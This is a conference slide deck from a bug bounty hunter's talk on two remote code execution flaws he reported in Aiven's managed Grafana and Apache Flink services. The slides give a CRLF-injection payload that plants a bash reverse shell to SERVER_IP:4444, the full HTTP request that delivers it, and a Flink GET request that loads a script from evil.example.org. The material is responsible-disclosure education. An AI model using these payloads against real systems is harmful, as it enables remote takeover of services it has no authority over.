---
theme: ./theme
colorSchema: light
title: Hacking Aiven managed services for fun and profit
---

# Hacking Aiven managed services for fun and profit

Jari Jääskelä, November 3. 2022, Helsec

---
layout: image-x
image: 'img/stats.png'
imageOrder: 2
---

# # whoami

- Bug Bounties since 2020
- "Full-time" for awhile at the start of 2022

<img src="img/aiven_rank.png"/>

<BarBottom title="hackerone.com/jarij">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>


---
layout: intro
---

# Overview

- About Bug Bounties
- Aiven Bug Bounty program
- My approach for huntings bugs through few examples

---

# What are Bug Bounties?

- Hackers rewarded for discovering security issues
- Reward based on impact

---

# What is Aiven?

- Managed service provider for Grafana, MySQL, PostgreSQL, etc ...
- Managed services hosted in Google Cloud, AWS, DigitalOcean, ... (customer can configure)
  - Infrastructure exists under Aiven's cloud account
- Customer does not have code execution access on managed services  

<img src="img/aiven_dashboard.png" style="height: 300px"/>

---

# Aiven Bug Bounty program

<img src="img/services.png" style="height:420px" />

<BarBottom title="hackerone.com/aiven_ltd">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Aiven Bug Bounty program


<img src="img/rewards_highlighted.png" />

<img src="img/severity_highlighted.png" style="height:225px" />


<BarBottom title="hackerone.com/aiven_ltd">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Grafana RCE (1)


<img src="img/grafana_aiven_config.png" style="height:400px"/>

- How the web backend updates the Grafana configuration?

<BarBottom title="hackerone.com/reports/1200647">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Grafana RCE (2)

- Let's look at the Grafana documentation
<img src="img/grafana_doc1.png"/>

<BarBottom title="hackerone.com/reports/1200647">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Grafana RCE (3)

- Supports configuration via grafana.ini file:

```txt
app_mode = production
instance_name = ${HOSTNAME}
force_migration = false

[paths]
data = data
temp_data_lifetime = 24h
logs = data/log
plugins = data/plugins
provisioning = conf/provisioning
[server]
# Protocol (http, https, h2, socket)
protocol = http
```

<BarBottom title="hackerone.com/reports/1200647">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Grafana RCE (3)

- Likely Aiven creates grafana.ini dynamically from user input

<BarBottom title="hackerone.com/reports/1200647">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Grafana RCE (4)

- Q1: Can we edit unsupported configuration options by injecting newline characters?
- Q2: How this could be escalated to Remote Command Execution (RCE)?

<BarBottom title="hackerone.com/reports/1200647">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Grafana RCE (5) - Q1

- Testing for CRLF injection (\r\n) AKA newline injection
- <b>API input validation schema in Github:</b>
    - github.com/aiven/terraform-provider-aiven/aiven/templates/service_user_config_schema.json

<BarBottom title="hackerone.com/reports/1200647">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Grafana RCE (6) - Q1

Example input validation entry:
```json
"recovery_basebackup_name": {
  "example": "backup-20191112t091354293891z",
  "maxLength": 128,
  "pattern": "^[a-zA-Z0-9-_:.]+$",
  "title": "Name of the basebackup to restore in forked service",
  "type": "string"
}
```

- Regex pattern validation
- `$` at the end == matches the end of the line == input cannot contain new line

<BarBottom title="hackerone.com/reports/1200647">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Grafana RCE (7) - Q1

SMTP server parameters missing regex validation. CRLF injection possible!!!

```json
  "smtp_server": {
    "additionalproperties": false,
    "properties": {
      "from_name": {
        "maxLength": 128,
        "type": [
          "string"
        ]
      },
      "host": {
        "maxLength": 255,
        "type": "string"
      },
      "password": {
        "maxLength": 255,
        "type": [
          "string"
        ]
      }
    }
  }
```

<BarBottom title="hackerone.com/reports/1200647">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Grafana RCE (x)

- Q1: Can we edit unsupported configuration options by injecting newline characters? ✅
- <b>Q2: How this could be escalated to Remote Command Execution (RCE)?</b>


<BarBottom title="hackerone.com/reports/1200647">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Grafana RCE (7) - Q2

<img src="img/grafana_rendering1.png"/>

<BarBottom title="hackerone.com/reports/1200647">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Grafana RCE (8) - Q2

<img src="img/grafana_rendering2.png"/>

<BarBottom title="hackerone.com/reports/1200647">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>


---

# Grafana RCE (x)

- <https://peter.sh/experiments/chromium-command-line-switches/>:
<img src="img/grafana_rendering3.png"/>

<BarBottom title="hackerone.com/reports/1200647">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>


---

# Grafana RCE (x)

- How to establish reverse shell?
- Bash supports /dev/tcp/SERVER_IP/SERVER_PORT - bash opens tcp connection to SERVER_IP:SERVER_PORT
- Bash reverse shell: `bash -l > /dev/tcp/SERVER_IP/4444 0<&1 2>&1`

<BarBottom title="hackerone.com/reports/1200647">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Grafana RCE (x)

```txt
[plugin.grafana-image-renderer]
rendering_args=--renderer-cmd-prefix=bash -c bash -l > /dev/tcp/SERVER_IP/4444 0<&1 2>&1
```

<BarBottom title="hackerone.com/reports/1200647">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Grafana RCE (9)

- For some reason, could not pass whitespaces, had to encode spaces using "$IFS"

```txt
[plugin.grafana-image-renderer]
rendering_args=--renderer-cmd-prefix=bash$IFS-l$IFS>$IFS/dev/tcp/SERVER_IP/4444$IFS0<&1$IFS2>&1
```

<BarBottom title="hackerone.com/reports/1200647">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Grafana RCE (9)

```http
PUT /v1/project/PROJECT_NAME/service/GRAFANA_INSTANCE_NAME HTTP/1.1
Host: console.aiven.io
Authorization: aivenv1 AIVEN_TOKEN_HERE
Content-Type: application/json

{
    "user_config": {
        "smtp_server": {
            "host": "example.org",
            "port": 1,
            "from_address": "x@examle.org",
            "password": "x\r\n[plugin.grafana-image-renderer]\r\nrendering_args=--renderer-cmd-prefix=bash -c 
            bash$IFS-l$IFS>$IFS/dev/tcp/SERVER_IP/4444$IFS0<&1$IFS2>&1"
        }
    }
}
```

- After config update, trigger rendering by browsing to https://GRAFANA_INSTANCE_NAME.aivencloud.com/render/x

<BarBottom title="hackerone.com/reports/1200647">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Grafana RCE (10)

<img src="img/report_grafana_reward.png"/>

<BarBottom title="hackerone.com/reports/1200647">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Apache Flink RCE (1)

- Apache Flink has REST API
- Aiven blocked access to some REST API endpoints via reverse proxy rules (HAProxy)
- However, all GET operations were still allowed


<BarBottom title="hackerone.com/reports/1418891">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Apache Flink RCE (2)

Apache Flink Rest API documentation:

<img src="img/flink-plan-get.png"/>

- Can specify java class name and class arguments !?! 🤔
- Potential RCE using GET request!?! What!!!


<BarBottom title="hackerone.com/reports/1418891">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Apache Flink RCE

- Finding the gadget ... TODO

<BarBottom title="hackerone.com/reports/1418891">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Apache Flink RCE

- GET <https://FLINK_INSTANCE_NAME.aivencloud.com/plan?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load(https://evil.example.org)&parallelism=1>

<BarBottom title="hackerone.com/reports/1418891">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Apache Flink RCE

<BarBottom title="hackerone.com/reports/1418891">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>  

---

# Apache Flink RCE

<img src="img/aiven-flink-rce.png"/>

<BarBottom title="hackerone.com/reports/1418891">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>

---

# Apache Flink RCE - Fun fact

- 🤔 GET /jars/:jarId/:plan was silently removed in Flink 1.16 (28 Oct 2022) release 🧐

<BarBottom title="hackerone.com/reports/1418891">
  <Item text="@JJaaskela">
    <carbon:logo-twitter />
  </Item>
</BarBottom>